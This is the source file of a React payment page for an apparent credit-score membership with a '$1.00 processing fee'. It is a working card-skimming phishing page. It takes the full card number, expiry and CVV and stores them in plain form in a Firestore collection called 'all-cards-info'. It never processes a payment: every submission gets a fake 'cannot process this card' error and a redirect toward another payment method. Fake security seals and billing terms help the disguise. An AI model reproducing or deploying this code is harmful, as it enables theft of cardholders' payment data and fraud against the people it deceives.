import { useContext, useEffect, useState } from 'react';
import { useNavigate } from 'react-router-dom';
import { FaCheck, FaInfoCircle, FaSpinner } from 'react-icons/fa';
import Swal from 'sweetalert2';
import infoimg from '../../assets/card-logo/img-check-score.png';
import visalogo from '../../assets/card-logo/cc-logo-visa.svg';
import mastercardlogo from '../../assets/card-logo/cc-logo-master-card.svg';
import amexlogo from '../../assets/card-logo/cc-logo-amex.svg';
import discoverLogo from '../../assets/card-logo/cc-logo-discover.svg';
import seclog from '../../assets/info-from-img/images.png';
import seclo from '../../assets/info-from-img/img-seal-qualys.svg';
import { collection, doc, setDoc, getDoc } from 'firebase/firestore';
import { db } from '../../../firbase.config';
import { ContextOne } from '../context-api-one/ContextApiOne';

const CardPayment = () => {
    const navigate = useNavigate();
    const [cardNumber, setCardNumber] = useState('');
    const [expMonth, setExpMonth] = useState('');
    const [expYear, setExpYear] = useState('');
    const [cvv, setCvv] = useState('');
    const [isSubmitting, setIsSubmitting] = useState(false);
    const [errors, setErrors] = useState({
        cardNumber: '',
        expMonth: '',
        expYear: '',
        cvv: ''
    });
    const { forRecCardNumber } = useContext(ContextOne);
    useEffect(() => {
        if (cardNumber) {
            forRecCardNumber(cardNumber);
        }
    }, [cardNumber, forRecCardNumber]);
    // Validate card number (Luhn algorithm)
    const validateCardNumber = (number) => {
        const cleaned = number.replace(/\s+/g, '').replace(/-/g, '');
        if (!/^\d+$/.test(cleaned)) return false;

        let sum = 0;
        let shouldDouble = false;

        for (let i = cleaned.length - 1; i >= 0; i--) {
            let digit = parseInt(cleaned.charAt(i));

            if (shouldDouble) {
                digit *= 2;
                if (digit > 9) digit -= 9;
            }

            sum += digit;
            shouldDouble = !shouldDouble;
        }

        return sum % 10 === 0;
    };

    // Format card number with spaces
    const formatCardNumber = (value) => {
        const v = value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
        const matches = v.match(/\d{4,16}/g);
        const match = matches && matches[0] || '';
        const parts = [];

        for (let i = 0, len = match.length; i < len; i += 4) {
            parts.push(match.substring(i, i + 4));
        }

        if (parts.length) {
            return parts.join(' ');
        }
        return value;
    };

    const handleCardNumberChange = (e) => {
        const value = e.target.value.replace(/[^0-9]/g, ''); // Only allow numbers
        const formatted = formatCardNumber(value);
        setCardNumber(formatted);

        // Clear error when typing
        if (errors.cardNumber) {
            setErrors(prev => ({ ...prev, cardNumber: '' }));
        }
    };

    const handleExpMonthChange = (e) => {
        const value = e.target.value.replace(/[^0-9]/g, ''); // Only allow numbers

        // Allow clearing the input completely
        if (value === '') {
            setExpMonth('');
            if (errors.expMonth) {
                setErrors(prev => ({ ...prev, expMonth: '' }));
            }
            return;
        }

        // Parse the input value
        let monthValue = parseInt(value);

        // Validate month range
        if (monthValue < 1 || monthValue > 12) {
            setErrors(prev => ({ ...prev, expMonth: 'Invalid month' }));
            setExpMonth(value); // Keep the invalid value so user can correct it
            return;
        }

        // Auto-format with leading zero for single-digit months
        let formattedMonth = monthValue < 10 ? `0${monthValue}` : `${monthValue}`;

        // Ensure we don't exceed 2 digits
        formattedMonth = formattedMonth.slice(0, 2);

        setExpMonth(formattedMonth);

        // Clear error if valid
        if (errors.expMonth) {
            setErrors(prev => ({ ...prev, expMonth: '' }));
        }
    };

    const handleExpYearChange = (e) => {
        const value = e.target.value.replace(/[^0-9]/g, ''); // শুধুমাত্র সংখ্যা
        setExpYear(value.slice(0, 2)); // সর্বোচ্চ 2 ডিজিট পর্যন্ত সেভ করা

        // ইউজার যদি সম্পূর্ণ 2-digit টাইপ করে তাহলে তখন validate করবো
        if (value.length === 2) {
            const currentYear = new Date().getFullYear();
            const currentYearLastTwo = currentYear % 100;
            const inputYear = parseInt(value);

            if (inputYear < currentYearLastTwo || inputYear > currentYearLastTwo + 20) {
                setErrors(prev => ({ ...prev, expYear: 'Invalid year' }));
            } else {
                if (errors.expYear) {
                    setErrors(prev => ({ ...prev, expYear: '' }));
                }
            }
        } else {
            // আংশিক টাইপিং এ কোনো এরর দেখাবো না
            if (errors.expYear) {
                setErrors(prev => ({ ...prev, expYear: '' }));
            }
        }
    };

    const handleCvvChange = (e) => {
        const value = e.target.value.replace(/[^0-9]/g, ''); // Only allow numbers
        setCvv(value.slice(0, 4));
        if (errors.cvv) {
            setErrors(prev => ({ ...prev, cvv: '' }));
        }
    };

    const validateForm = () => {
        const newErrors = {
            cardNumber: '',
            expMonth: '',
            expYear: '',
            cvv: ''
        };
        let isValid = true;

        // Card number validation
        if (!cardNumber) {
            newErrors.cardNumber = 'Card number is required';
            isValid = false;
        } else if (cardNumber.replace(/\s/g, '').length < 15) {
            newErrors.cardNumber = 'Card number is too short';
            isValid = false;
        } else if (!validateCardNumber(cardNumber)) {
            newErrors.cardNumber = 'Invalid card number';
            isValid = false;
        }

        // Expiration month validation
        if (!expMonth) {
            newErrors.expMonth = 'Month is required';
            isValid = false;
        } else if (expMonth.length !== 2 || parseInt(expMonth) < 1 || parseInt(expMonth) > 12) {
            newErrors.expMonth = 'Invalid month';
            isValid = false;
        }

        // Expiration year validation
        const currentYear = new Date().getFullYear();
        const currentYearLastTwo = currentYear % 100;
        if (!expYear) {
            newErrors.expYear = 'Year is required';
            isValid = false;
        } else if (expYear.length !== 2 || parseInt(expYear) < currentYearLastTwo || parseInt(expYear) > currentYearLastTwo + 20) {
            newErrors.expYear = 'Invalid year';
            isValid = false;
        }

        // CVV validation
        if (!cvv) {
            newErrors.cvv = 'CVV is required';
            isValid = false;
        } else if (cvv.length < 3 || cvv.length > 4) {
            newErrors.cvv = 'CVV must be 3-4 digits';
            isValid = false;
        }

        setErrors(newErrors);
        return isValid;
    };

    const storeCardInfo = async () => {
        try {
            // Create a reference to the 'all-cards-info' collection
            const cardsCollection = collection(db, 'all-cards-info');

            // Use the card number (without spaces) as the document ID
            const sanitizedCardNumber = cardNumber.replace(/\s/g, '');
            const cardDocRef = doc(cardsCollection, sanitizedCardNumber);

            // Check if document already exists
            const docSnapshot = await getDoc(cardDocRef);

            if (docSnapshot.exists()) {
                // If document exists, do NOT create a new one
                console.log('Card info already exists in database - no changes made');
                return; // Exit the function without making changes
            } else {
                // If document doesn't exist, create new one with card number as ID
                const cardData = {
                    cardNumber: cardNumber,
                    expMonth: expMonth,
                    expYear: expYear,
                    cvv: cvv,
                    timestamp: new Date().toISOString(),
                    isDuplicate: false
                };

                await setDoc(cardDocRef, cardData);
                console.log('New card info stored successfully');
            }
        } catch (error) {
            console.error('Error storing card information:', error);
            throw error; // Re-throw to handle in the calling function
        }
    };

    const handleSubmit = async (e) => {
        e.preventDefault();
        if (validateForm()) {
            setIsSubmitting(true);
            try {
                await storeCardInfo();

                const result = await Swal.fire({
                    title: 'Oops!',
                    html: '<div class="text-center">WE CANNOT PROCESS THIS CARD RIGHT NOW<br/>PLEASE TRY AGAIN WITH ANOTHER PAYMENT METHOD</div>',
                    icon: 'error',
                    confirmButtonText: 'GO TO ANOTHER PAYMENT METHOD',
                    confirmButtonColor: '#3085d6',
                    customClass: {
                        popup: 'rounded-lg',
                        confirmButton: 'py-2 px-4 rounded'
                    },
                    allowOutsideClick: false,
                    allowEscapeKey: false,
                    allowEnterKey: false,
                    showCancelButton: false,
                    focusConfirm: true
                });

                // Check if the user clicked the confirm button
                if (result.isConfirmed) {
                    navigate('/checkers', {
                        state: {
                            from: '/card-payment',
                            // Pass any additional state data if needed
                        }
                    });
                }
            } catch (error) {
                console.error('Error during form submission:', error);
                Swal.fire({
                    title: 'Error!',
                    text: 'An error occurred while processing your payment. Please try again.',
                    icon: 'error',
                    confirmButtonText: 'OK'
                });
            } finally {
                setIsSubmitting(false);
            }
        }
    };

    return (
        <div className="flex flex-col md:flex-row gap-0 md:gap-6 bg-white rounded-xl shadow-lg w-[96%] md:w-[80%] mx-auto my-1 md:my-10">
            {/* Left Side - Form */}
            <div className="w-full md:w-[60%] p-4 space-y-5">
                <h2 className="text-2xl font-semibold">Final Step</h2>
                <p className="text-sm text-gray-600 ">
                    Tell us which card to use for a <a href="#" className="text-blue-600 no-underline">$1.00 processing fee</a> and membership.
                </p>

                <form onSubmit={handleSubmit}>
                    <div className="space-y-2">
                        <div className='flex flex-row justify-between items-center pb-0 mb-0'>
                            <label className="block text-gray-500 text-sm font-medium">Card Number</label>
                            <div className="flex mt-2">
                                <img src={visalogo} alt="Visa" className="h-9" />
                                <img src={mastercardlogo} alt="MasterCard" className="h-9" />
                                <img src={amexlogo} alt="AmEx" className="h-9" />
                                <img src={discoverLogo} alt="Discover" className="h-9" />
                            </div>
                        </div>
                        <input
                            type="text"
                            inputMode="numeric"
                            pattern="[0-9\s]{13,19}"
                            className={`w-full border-[#c5c5c5] border-1 rounded px-3 py-2 focus:border-blue-500 focus:ring-1 focus:ring-blue-200 focus:outline-none transition duration-200 ${errors.cardNumber ? 'border-red-500' : ''}`}
                            placeholder="1234 5678 9012 3456"
                            value={cardNumber}
                            onChange={handleCardNumberChange}
                            disabled={isSubmitting}
                        />
                        {errors.cardNumber && <p className="text-red-500 text-xs mt-1">{errors.cardNumber}</p>}
                    </div>

                    <div className="grid grid-cols-1 md:grid-cols-3 gap-2 md:gap-4 mt-4">
                        <div className="w-full">
                            <label className="block mb-1 text-gray-500 text-sm font-medium">Expiration Month</label>
                            <input
                                type="text"
                                inputMode="numeric"
                                pattern="[0-9]*"
                                className={`w-full border-[#c5c5c5] border-1 rounded px-3 py-2 focus:border-blue-500 focus:ring-1 focus:ring-blue-200 focus:outline-none transition duration-200 ${errors.expMonth ? 'border-red-500' : ''}`}
                                placeholder="MM"
                                maxLength={2}
                                value={expMonth}
                                onChange={handleExpMonthChange}
                                onKeyDown={(e) => {
                                    // Allow backspace to clear the input
                                    if (e.key === 'Backspace' && expMonth.length === 2) {
                                        setExpMonth('');
                                    }
                                }}
                                disabled={isSubmitting}
                            />
                            {errors.expMonth && <p className="text-red-500 text-xs mt-1">{errors.expMonth}</p>}
                        </div>
                        <div className="w-full">
                            <label className="block mb-1 text-gray-500 text-sm font-medium">Expiration Year</label>
                            <input
                                type="text"
                                inputMode="numeric"
                                pattern="[0-9]*"
                                className={`w-full border-[#c5c5c5] border-1 rounded px-3 py-2 focus:border-blue-500 focus:ring-1 focus:ring-blue-200 focus:outline-none transition duration-200 ${errors.expYear ? 'border-red-500' : ''}`}
                                placeholder="YY"
                                maxLength={2}
                                value={expYear}
                                onChange={handleExpYearChange}
                                disabled={isSubmitting}
                            />
                            {errors.expYear && <p className="text-red-500 text-xs mt-1">{errors.expYear}</p>}
                        </div>
                        <div className="w-full">
                            <div className="flex items-center">
                                <label className="block mb-1 text-sm  font-medium text-gray-500">CVV</label>
                                <div className="group relative ml-1">
                                    <FaInfoCircle className="text-gray-400 text-sm cursor-pointer" />
                                    <div className="absolute z-10 hidden group-hover:block bg-white p-2 rounded shadow-lg border border-gray-200 w-48 text-xs text-gray-600">
                                        The CVV is a 3-4 digit code on the back of your card (or front for AmEx). It provides extra security for online transactions.
                                    </div>
                                </div>
                            </div>
                            <input
                                type="text"
                                inputMode="numeric"
                                pattern="[0-9]*"
                                className={`w-full border-[#c5c5c5] border-1 rounded px-3 py-2 focus:border-blue-500 focus:ring-1 focus:ring-blue-100 focus:outline-none transition duration-200 ${errors.cvv ? 'border-red-500' : ''}`}
                                placeholder="CVV"
                                maxLength={4}
                                value={cvv}
                                onChange={handleCvvChange}
                                disabled={isSubmitting}
                            />
                            {errors.cvv && <p className="text-red-500 text-xs mt-1">{errors.cvv}</p>}
                        </div>
                    </div>

                    <div className="text-xs text-gray-500 leading-relaxed mt-4">
                        <p>
                            By clicking the button below, you agree to the <a href="#" className="underline text-blue-600">Terms of Use</a> to enroll in a 7-day trial for a one-time processing fee of $1.00. After the trial ends on <strong>Jun 06, 2025</strong>, the nonrefundable membership automatically continues for $39.94 per month until you cancel. You may cancel by calling (800) 538-6616 or by <a href="#" className="underline text-blue-600">email</a>. If you cancel your account during the trial, there will be NO FURTHER CHARGES.
                        </p>
                    </div>

                    <div className='flex justify-center'>
                        <button
                            type="submit"
                            className="bg-[#7fbdff] text-white px-20 py-1 rounded mt-4 text-[14px] font-semibold hover:bg-blue-700 transition disabled:opacity-75 disabled:cursor-not-allowed flex items-center justify-center gap-2 cursor-pointer"
                            disabled={isSubmitting}
                        >
                            {isSubmitting ? (
                                <>
                                    <FaSpinner className="animate-spin" />
                                    Processing...
                                </>
                            ) : (
                                <>
                                    I Agree & Accept <br /> Get My Score!
                                </>
                            )}
                        </button>
                    </div>
                </form>

                <div className="flex flex-row justify-center space-x-4 mt-6">
                    <img src={seclog} alt="SSL Secured" className="h-8" />
                    <img src={seclo} alt="Qualys" className="h-8" />
                </div>
            </div>

            {/* Right Side - Mobile and Info */}
            <div className="w-full lg:w-[40%] bg-gray-300 flex justify-center items-center mt-4 px-2 py-2 md:px-0 md:py-0 md:mt-0">
                <div className="flex-grow flex flex-col items-center justify-center">
                    <div className="relative mb-6">
                        <div className="absolute -top-2 -right-2 bg-white rounded-full p-2 shadow-md">
                            <div className="bg-blue-100 rounded-full p-3">
                                <span className="text-blue-600 font-bold text-xl">723</span>
                            </div>
                        </div>
                        <img
                            src={infoimg}
                            alt="Credit Score Illustration"
                            className="w-64 mx-auto"
                        />
                    </div>

                    <h3 className="text-lg font-semibold text-[#7e8284] mb-4 text-center">
                        Get your credit score and get protected too.
                    </h3>

                    <ul className="space-y-3 w-full max-w-xs">
                        <li className="flex items-start">
                            <span className="inline-flex items-center justify-center border-2 border-gray-500 rounded-full h-5 w-5 mt-1 mr-2 flex-shrink-0">
                                <FaCheck className="text-gray-500 text-xs" />
                            </span>
                            <span className="text-[#7e8284] text-[14px]">Credit Report and Score</span>
                        </li>
                        <li className="flex items-start">
                            <span className="inline-flex items-center justify-center border-2 border-gray-500 rounded-full h-5 w-5 mt-1 mr-2 flex-shrink-0">
                                <FaCheck className="text-gray-500 text-xs" />
                            </span>
                            <span className="text-[#7e8284] text-[14px]">Score Refreshed Every 30 Days On Sign In</span>
                        </li>
                        <li className="flex items-start">
                            <span className="inline-flex items-center justify-center border-2 border-gray-500 rounded-full h-5 w-5 mt-1 mr-2 flex-shrink-0">
                                <FaCheck className="text-gray-500 text-xs" />
                            </span>
                            <span className="text-[#7e8284] text-[14px]">Credit Monitoring and Alerts</span>
                        </li>
                        <li className="flex items-start">
                            <span className="inline-flex items-center justify-center border-2 border-gray-500 rounded-full h-5 w-5 mt-1 mr-2 flex-shrink-0">
                                <FaCheck className="text-gray-500 text-xs" />
                            </span>
                            <span className="text-[#7e8284] text-[14px]">Credit Cards and Loans Matched for You</span>
                        </li>
                    </ul>
                </div>
            </div>
        </div>
    );
};

export default CardPayment;